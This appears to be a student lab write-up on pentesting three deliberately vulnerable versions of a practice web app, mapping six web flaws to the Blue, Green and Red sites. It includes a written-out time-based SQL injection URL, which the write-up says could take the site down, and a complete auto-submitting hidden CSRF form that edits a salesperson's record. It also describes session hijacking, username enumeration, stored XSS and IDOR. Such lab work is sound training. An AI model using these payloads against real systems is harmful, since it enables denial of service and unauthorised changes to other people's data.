# Pentesting Live Targets

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL Injection

![image](https://i.gyazo.com/29cdc0f6d1cb3b8c5586d0d2badafb98.gif)

Running https://35.184.88.145//blue/public/salesperson.php?id=’ OR SLEEP(100)=0– in the browser could bring down the website indefinitely. However, ASCII Encoding would need to be used:
```
https://35.184.88.145//blue/public/salesperson.php?id=%27%20OR%20SLEEP(5)=0--%27 
```

Vulnerability #2: Session Hijacking

![image](https://i.gyazo.com/1a7b39c794c507bd994824b2ab2dc601.gif)

It is possible to use an admin's session ID and the change session ID tool to gain access to an admin's session.


## Green

Vulnerability #1: Username Enumeration

![image](https://i.gyazo.com/4ee92e9390c2848d1d6931a52719c9fe.gif)

It is possible to look up whether a user exists or not by using the login form. A bolded "Log in was unsuccessful" message represents that the user exists, while a plain message means that the user doesn't exist.


Vulnerability #2: Cross Site Scripting (XSS)

![image](https://i.gyazo.com/f9b5c3f66620e8a7ad9cfff909825407.gif)

Malicious javascript code could be submitted via the contact form on the site. An admin logging into the site to view the contact form entries would activate the script.

## Red

Vulnerability #1: IDOR

![image](https://i.gyazo.com/8c72bc43ee9eca5baddd76b5a46dd579.gif)

Changing the ID parameter of the Saleperson's URL allows the attacker to use a GET request to view hidden pages.

Vulnerability #2: CSRF

![image](https://i.gyazo.com/4f66da4e5f3367d0559a2cc5d4cb7866.gif)

It is possible to forge a POST request to edit a salesperson's information by using the form below. Social engineering via the contact form could be used to convince the admin to click on the link.


```
<html>
  <head>
    <title>Loading...</title>
  </head>
  <body onload="document.my_form.submit()">
    <form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=5" method="POST" name="my_form" style="display: none;" target="hidden_results" >
      <input type="text" name="first_name" value="SAMMMMM" />
      <input type="text" name="last_name" value="Lee" />
      <input type="text" name="phone" value="676-676-6767" />
      <input type="text" name="email" value="sam@sam.com" />
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>
```

